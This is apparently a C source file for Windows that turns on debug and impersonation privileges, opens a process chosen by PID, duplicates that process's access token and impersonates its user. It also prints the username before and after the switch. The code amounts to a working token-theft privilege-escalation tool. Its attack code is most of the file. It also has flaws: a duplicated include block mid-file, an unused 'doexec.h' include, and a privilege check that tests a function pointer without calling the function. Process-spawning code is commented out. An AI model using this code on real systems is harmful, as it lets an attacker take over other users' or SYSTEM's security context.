#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "doexec.h"

// Compile with gcc open_notepad.c -o open_notepad -ladvapi32

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    return GetLastError() == ERROR_NOT_ALL_ASSIGNED ? FALSE : TRUE;
}

HANDLE OpenProcessWithToken(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess error: %u\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
        printf("[-] DuplicateTokenEx error: %u\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    return hDuplicatedToken;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

#include <windows.h>
#include <stdio.h>

BOOL EnableImpersonatePrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid)) {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] The impersonate privilege could not be enabled.\n");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void name(){
    char username[256]; 
    DWORD username_len = sizeof(username);  // Length of the buffer
    // Get the username of the current user
    if (GetUserNameA(username, &username_len)) {
       printf("[+] Current user: %s\n", username);
    } else {
        printf("Failed to get username: %lu\n", GetLastError());
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    if (!EnableDebugPrivilege()) {
        return 1;
    }

    if(!EnableImpersonatePrivilege){
        return 1;
    }

    name();

    DWORD pid = atoi(argv[1]);
    HANDLE hToken = OpenProcessWithToken(pid);
    if (hToken) {
        printf("[+] Successfully obtained duplicated token.\n");

        // Impersonate the user
        if (!ImpersonateLoggedOnUser(hToken)) {
            printf("[-] ImpersonateLoggedOnUser error: %u\n", GetLastError());
            CloseHandle(hToken);
            return 1;
        }

        name();
        // Spawn Notepad
       // STARTUPINFO si;
       // PROCESS_INFORMATION pi;

        //ZeroMemory(&si, sizeof(si));
        //si.cb = sizeof(si);
       // ZeroMemory(&pi, sizeof(pi));


       // if (!CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         //   printf("[-] CreateProcess error: %u\n", GetLastError());
       // } else {
         //   printf("[+] Notepad spawned!\n");
           // CloseHandle(pi.hProcess);
           // CloseHandle(pi.hThread);
       // }

        // Revert to self
        RevertToSelf();
        CloseHandle(hToken);
    }

    return 0;
}